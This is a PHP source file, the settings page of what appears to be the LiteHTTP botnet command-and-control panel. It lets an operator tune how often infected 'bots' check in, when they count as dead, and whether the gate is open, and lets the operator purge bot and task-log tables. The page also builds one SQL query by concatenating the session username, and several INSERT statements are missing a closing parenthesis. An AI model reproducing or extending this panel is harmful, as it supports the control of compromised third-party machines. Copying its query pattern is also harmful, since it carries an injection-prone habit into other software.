<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];
$userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);

include 'inc/stats.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li>
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li>
						<a href="?p=bots">
							<i class="fa fa-list"></i> <span>Bots</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
					<li>
						<a href="?p=tasks">
							<i class="fa fa-bar-chart"></i> <span>Tasks</span>
						</a>
					</li>
					<li class="active">
						<a href="?p=settings">
							<i class="fa fa-cog"></i> <span>Settings</span>
						</a>
					</li>
					<li>
						<a href="?p=users">
							<i class="fa fa-users"></i> <span>Users</span>
						</a>
					</li>
					<li>
						<a href="?p=logs">
							<i class="fa fa-list-alt"></i> <span>Panel Logs</span>
						</a>
					</li>
					<li>
						<a href="?p=help">
							<i class="fa fa-question"></i> <span>Help</span>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="row">
					<div class="col-lg-7 col-xs-14">
						<?php
						if ($userperms != "admin")
						{
							echo '<div class="alert alert-danger">You do not have permission to view this page.</div>';
							die();
						}
						if (isset($_GET['clear']))
						{
							$clear = strtolower($_GET['clear']);
							$safe = array("dead", "offline", "dirty", "all", "tasklogs");
							if (in_array($clear, $safe))
							{
								if ($clear == "dead")
								{
									$d = $odb->prepare("DELETE FROM bots WHERE lastresponse + :d < UNIX_TIMESTAMP()");
									$d->execute(array(":d" => $deadi));
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dead bots from table', UNIX_TIMESTAMP())");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "offline"){
									$o = $odb->prepare("DELETE FROM bots WHERE (lastresponse + :o < UNIX_TIMESTAMP()) AND (lastresponse + :d > UNIX_TIMESTAMP())");
									$o->execute(array(":o" => $knock + 120, ":d" => $deadi));
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared offline bots from table', UNIX_TIMESTAMP())");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "dirty"){
									$odb->query("DELETE FROM bots WHERE mark = '2'");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dirty bots from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "tasklogs"){
									$odb->query("TRUNCATE tasks_completed");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared task execution logs from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else{
									$odb->query("TRUNCATE bots");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared all bots from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}
								echo '<div class="alert alert-success">Successfully cleared entries. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}else{
								echo '<div class="alert alert-danger">Invalid clear option. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}
						}
						if (isset($_POST['updateSettings']))
						{
							$newknock = $_POST['knock'];
							$newdead = $_POST['dead'];
							$newgate = $_POST['gstatus'];
							if (!ctype_digit($newknock) || !ctype_digit($newdead) || !ctype_digit($newgate))
							{
								echo '<div class="alert alert-danger">One of the parameters was not a digit. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}else{
								$up = $odb->prepare("UPDATE settings SET knock = :k, dead = :d, gate_status = :g LIMIT 1");
								$up->execute(array(":k" => $newknock, ":d" => $newdead, ":g" => $newgate));
								$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Updated panel settings', UNIX_TIMESTAMP())");
								$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								echo '<div class="alert alert-success">Settings successfully updated. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=settings">';
								
							}
						}
						?>
						<div class="nav-tabs-custom">
							<ul class="nav nav-tabs">
								<li class="active">
									<a href="#main" data-toggle="tab">Main</a>
								</li>
								<li>
									<a href="#database" data-toggle="tab">Database</a>
								</li>
							</ul>
							<div class="tab-content">
								<div class="tab-pane active" id="main">
									<form action="" method="POST" class="col-lg-6">
										<label>Knock Interval</label>
										<div class="input-group">
											<input type="text" name="knock" class="form-control" value="<?php echo $odb->query("SELECT knock FROM settings LIMIT 1")->fetchColumn(0); ?>">
											<span class="input-group-addon">Minutes</span>
										</div>
										<br>
										<label>Dead after</label>
										<div class="input-group">
											<input type="text" name="dead" class="form-control" value="<?php echo $odb->query("SELECT dead FROM settings LIMIT 1")->fetchColumn(0); ?>">
											<span class="input-group-addon">Days</span>
										</div>
										<br>
										<label>Gate Status</label>
										<select name="gstatus" class="form-control">
											<?php
											$val = $odb->query("SELECT gate_status FROM settings LIMIT 1")->fetchColumn(0);
											if ($val == "1")
											{
												echo '<option value="1" selected>Enabled</option><option value="2">Disabled</option>';
											}else{
												echo '<option value="1">Enabled</option><option value="2" selected>Disabled</option>';
											}
											?>
										</select>
										<br>
										<center><input type="submit" name="updateSettings" class="btn btn-success" value="Update Settings"></center>
									</form>
									<div class="clearfix"></div>
								</div>
								<div class="tab-pane" id="database">
									<h3>Statistics</h3>
									<p>The database is currently using <b><?php echo $odb->query("SELECT ROUND(SUM(data_length + index_length) / 1024, 2) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0); ?> KB</b> of space, with <b><?php echo number_format($odb->query("SELECT SUM(table_rows) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0)); ?></b> rows in total.</p>
									<hr>
									<h3>Optimization</h3>
									<a href="?p=settings&clear=dead" class="btn btn-danger">Clear Dead Bots</a>
									<a href="?p=settings&clear=offline" class="btn btn-danger">Clear Offline Bots</a>
									<a href="?p=settings&clear=dirty" class="btn btn-danger">Clear Dirty Bots</a>
									<a onclick="ask('1')" class="btn btn-danger">Clear All Bots</a>
									<a onclick="ask('2')" class="btn btn-danger">Clear Task Execution Logs</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
	<script type="text/javascript">
		function ask(id)
		{
			if (id == "1")
			{
				if (confirm("WARNING: You are about to clear all of the bots from your database! Are you sure you want to do this?"))
				{
					setTimeout('window.location = "?p=settings&clear=all"', 1000);
				}
			}else{
				if (confirm("WARNING: You are about to clear all task execution logs from your database! This could lead to inaccurate numbers on the Tasks page. Are you sure you want to do this?"))
				{
					setTimeout('window.location = "?p=settings&clear=tasklogs"', 1000);
				}
			}
		}
	</script>
</body>
</html>